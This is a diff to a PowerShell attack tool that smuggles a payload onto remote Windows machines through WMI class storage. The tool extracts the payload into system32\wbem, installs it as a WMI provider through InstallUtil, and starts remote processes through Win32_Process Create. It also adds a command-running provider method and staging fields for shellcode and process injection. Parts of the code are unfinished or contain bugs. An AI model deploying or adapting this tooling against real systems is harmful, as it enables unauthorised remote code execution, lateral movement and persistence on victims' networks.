@@ -28,16 +28,20 @@ Function Invoke-WMIUpload {
             [string]$PayloadName = $PayloadPath,
         [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
             [string]$ClassName = "WMIFS",
+        [Parameter(Mandatory=$true, HelpMessage="Location on remote file system to place extracted file.")]
+            [string]$Destination = "$env:windir\system32\wbem\",
         [Parameter(Mandatory=$false, HelpMessage="Credential object to pass.")]
             [object]$Credential
     )
     Begin {
+        $null = Remove-WmiObject -Class $ClassName -Credential $Credential -ComputerName $Target -Verbose
     } Process {
-        Remove-WmiObject -Class $ClassName -Credential $Credential -ComputerName $Target -Verbose
         $null = New-WMIClass -ClassName $ClassName -Target $Target -Username $Credential.UserName -SecurePassword $Credential.Password -Verbose
         $EncodedText = ConvertTo-Base64 -FileName $PayloadPath -Verbose
         Invoke-InsertFileThreaded -Target $Target -EncodedText $EncodedText -FileName $PayloadName -ClassName $ClassName -StrLen 8000 -Verbose -Credential $Credential   
-    } End { 
+        Invoke-WMIRemoteExtract -Target $Target -PayloadName $PayloadName -ClassName $ClassName -Destination $Destination -Credential $Credential
+        Install-WMIProviderInstallUtil -Target $Target -Library $Destination\$PayloadName
+    } End {
     }
 }
 
@@ -87,79 +91,6 @@ Function Invoke-WMIRemoteExtract {
 }
 
 ################################################################################
-# Register WMI Provider Method
-################################################################################
-Function Install-WMIProviderMethod {
-<#
-	.SYNOPSIS
-	
-	.PARAMETER Target
-    
-    .PARAMETER Payload
-
-    .PARAMETER ClassName
-	
-	.EXAMPLE
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$Target = ".",
-        [Parameter(Mandatory=$true, HelpMessage="Name of payload to extract.")]
-            [string]$Payload,
-        [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
-            [string]$ClassName = "WMIFS"
-    )
-    Begin {
-        
-    } Process {
-        
-    } End { 
-
-    }
-}
-
-################################################################################
-# Extract file remotely
-################################################################################
-Function Install-WMIProviderManual {
-<#
-	.SYNOPSIS
-	
-	.PARAMETER Target
-    
-    .PARAMETER Payload
-
-    .PARAMETER ClassName
-
-    .PARAMETER Destination
-	
-	.EXAMPLE
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$Target = ".",
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$Payload,
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$ClassName = "WMIFS",
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$Library = "$env:windir\system32\wbem\"
-    )
-    Begin {
-        $InParameters = New-Parameters -Direction In
-        $OutParameters = New-Parameters -Direction Out
-    } Process {
-        
-    } End { 
-        
-    }
-}
-
-################################################################################
 # Extract file remotely
 ################################################################################
 Function Install-WMIProviderInstallUtil {
@@ -181,10 +112,6 @@ Function Install-WMIProviderInstallUtil {
     Param(
         [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
             [string]$Target = ".",
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$Payload,
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$ClassName = "WMIFS",
         [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
             [string]$Library = "$env:windir\system32\wbem\"
     )
@@ -230,7 +157,7 @@ Function Install-WMIProviderPowerShell {
             [string]$Library = "$env:windir\system32\wbem\"
     )
     Begin {
-        $RemoteCommand = "`"powershell.exe -Command `"+[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@($Library))"
+        $RemoteCommand = "`"powershell.exe -Command `"+[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@('$Library'))"
         '''
         "powershell.exe -Command "+[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@(test.dll))
         '''
@@ -238,6 +165,74 @@ Function Install-WMIProviderPowerShell {
         Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Credential $Credential
     } End { 
         
+    }
+}
+
+################################################################################
+# Register WMI Provider Method
+################################################################################
+Function Install-WMIProvider {
+<#
+	.SYNOPSIS
+	
+	.PARAMETER Target
+    
+    .PARAMETER Payload
+
+    .PARAMETER ClassName
+	
+	.EXAMPLE
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Target = ".",
+        [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
+            [string]$ClassName,
+        [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
+            [string]$Provider
+    )
+    Begin {
+        $Class = New-Object System.Management.ManagementClass("ROOT\CIMv2", $null)
+        $Class.Name = $ClassName
+        $Class.Qualifiers.Add("dynamic", $true, $false, $true, $false, $true)
+        $Class.Qualifiers.Add("provider", $Provider, $false, $true, $false, $true)
+        $Class.Qualifiers.Add("SupportsCreate", $true)
+        $Class.Qualifiers.Add("CreateBy", "Create")
+        $Class.Qualifiers.Add("SupportsDelete", $true)
+        $Class.Qualifiers.Add("DeleteBy", "DeleteInstance")
+        $Class.Qualifiers.Add("Locale", 1033, $false, $true, $false, $true)
+        #Add new-guid
+        $Class.Qualifiers.Add("UUID", "{8503C4DC-5FBB-11D2-AAC1-006008C78BC7}", $false, $true, $false, $true)
+
+        $command = New-MethodParameter -Direction "In" -Property "command" -CimType String
+        $output = New-MethodParameter -Direction "Out" -Property "output" -CimType String
+    } Process {
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunCMD" -MethodInParameters @($command) -MethodOutParameters @($output)
+    } End { 
+
+    }
+}
+
+
+################################################################################
+################################################################################
+Function New-MethodParameter {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Method to add.")] 
+            [ValidateSet("In", "Out")]
+            [String]$Direction,
+        [Parameter(Mandatory=$True, HelpMessage=".")] 
+            [String]$Property,
+        [Parameter(Mandatory=$True, HelpMessage=".")] 
+            [System.Management.CimType]$CimType
+    )
+     Return New-Object psobject -Property @{
+        Direction = $Direction
+        Property = $Property 
+        CimType = $CimType
     }
 }
 
@@ -250,20 +245,94 @@ Function local:Add-WMIProviderClassMethod {
             [Object][ref]$Class,
         [Parameter(Mandatory=$True, HelpMessage="Method to add.")] 
             [String]$MethodName,
-        [Parameter(Mandatory=$True, HelpMessage=".")]
-            [Object]$InParametersManagementBaseObjectInstance,
         [Parameter(Mandatory=$True, HelpMessage=".")] 
-            [Object]$OutParametersManagementBaseObjectInstance,
+            [Object[]]$MethodInParameters,
         [Parameter(Mandatory=$True, HelpMessage=".")] 
-            [Object]$MappingStrings
+            [Object[]]$MethodOutParameters
     )
-    $Class.Methods.Add($MethodName, $InParametersManagementBaseObjectInstance, $OutParametersManagementBaseObjectInstance)
-    $Class.Methods["$MethodName"].Qualifiers.Add("Constructor", $true)
-    $Class.Methods["$MethodName"].Qualifiers.Add("Static", $true)
-    $Class.Methods["$MethodName"].Qualifiers.Add("Implemented", $true)
-    $Class.Methods["$MethodName"].Qualifiers.Add("Privileges", [String[]]@("SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege", "SeRestorePrivilege"), $false, $false, $true, $true)
-    $Class.Methods["$MethodName"].Qualifiers.Add("ValueMap", [String[]]@("0", "2", "3", "8", "9", "21", ".."), $false, $false, $true, $true)
-    $Class.Methods["$MethodName"].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings, $false, $false, $true, $true)
+    Begin {
+        $InParameters = New-Parameters -Direction In
+        $OutParameters = New-Parameters -Direction Out
+    } Process {
+        $Index = 0
+        $MethodInParameters | ForEach-Object {
+            Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction $_.Direction -Index $Index -Property $_.Property -CimType $_.CimType
+            $Index++
+        }
+        
+        $MethodOutParameters | ForEach-Object {
+            Add-WMIProviderClassProperty -Parameters ([ref] $OutParameters) -Direction $_.Direction -Index $Index -Property $_.Property -CimType $_.CimType
+            $Index++
+        }
+    } End {
+       $InParametersManagementBaseObjectInstance = Get-ManagementBaseObject -Parameter $InParameters
+       $OutParametersManagementBaseObjectInstance = Get-ManagementBaseObject -Parameter $OutParameters
+       $Class.Methods.Add($MethodName, $InParametersManagementBaseObjectInstance, $OutParametersManagementBaseObjectInstance)
+    }
+}
+
+
+################################################################################
+# Extract file remotely
+################################################################################
+Function Install-WMIProviderManual {
+<#
+	.SYNOPSIS
+	
+	.PARAMETER Target
+    
+    .PARAMETER Payload
+
+    .PARAMETER ClassName
+
+    .PARAMETER Destination
+	
+	.EXAMPLE
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Target = ".",
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Payload,
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$ClassName = "WMIFS",
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Library = "$env:windir\system32\wbem\"
+    )
+    Begin {
+        
+        
+    } Process {
+        # Add all properties/parameters needed for provider
+        $InParametersManagementBaseObjectInstance = Get-ManagementBaseObject -Parameters $InParameters
+        $OutParametersManagementBaseObjectInstance = Get-ManagementBaseObject -Parameters $OutParameters
+
+        
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 1 -Property "parameters"-CimType ([System.Management.CimType]::String)
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 2 -Property "server" -CimType ([System.Management.CimType]::String)
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 3 -Property "database" -CimType ([System.Management.CimType]::String)
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 4 -Property "username" -CimType ([System.Management.CimType]::String)
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 5 -Property "password" -CimType ([System.Management.CimType]::String)
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 6 -Property "shellCodeString" -CimType ([System.Management.CimType]::String)
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 7 -Property "processId" -CimType ([System.Management.CimType]::SInt32)
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 8 -Property "library" -CimType ([System.Management.CimType]::String)
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 9 -Property "fileName" -CimType ([System.Management.CimType]::String)
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 10 -Property "stagingKey" -CimType ([System.Management.CimType]::String)
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 11 -Property "language" -CimType ([System.Management.CimType]::String)
+
+        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction Out -Index 12 -Property "output" -CimType ([System.Management.CimType]::String)
+
+        # Add all properties/parameters needed for provider
+        Add-WMIProviderClassMethod -Class $Class
+
+
+        # Add all metheds
+        # Put the class
+    } End { 
+        
+    }
 }
 
 ################################################################################
@@ -280,13 +349,18 @@ Function local:Add-WMIProviderClassProperty {
             [String]$Direction,
         [Parameter(Mandatory=$True, HelpMessage=".")] 
             [Int]$Index,
+        [Parameter(Mandatory=$False, HelpMessage=".")] 
+            [Object]$MappingStrings,
         [Parameter(Mandatory=$True, HelpMessage=".")] 
-            [Object]$MappingStrings
+            [System.Management.CimType]$CimType
     )
-    $Parameters.Properties.Add($Property, [System.Management.CimType]::String, $false)
+    $Parameters.Properties.Add($Property, $CimType, $false)
     $Parameters.Properties[$Property].Qualifiers.Add($Direction, $false)
     $Parameters.Properties[$Property].Qualifiers.Add("ID", $Index, $false, $true, $false, $false)
-    $Parameters.Properties[$Property].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings)
+    if ($MappingString)
+    {
+        $Parameters.Properties[$Property].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings)
+    }
 }
 
 
@@ -335,9 +409,9 @@ Function local:Get-ManagementBaseObject {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$True, HelpMessage=".")] 
-            [Object]$Class
+            [Object]$Parameters
     )
-    $TempPtr = [System.IntPtr]$Class
+    $TempPtr = [System.IntPtr]$Parameters
     $DotNetPath = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
     $SystemManagement = [System.Reflection.Assembly]::LoadFile($DotNetPath+"System.Management.dll")
 
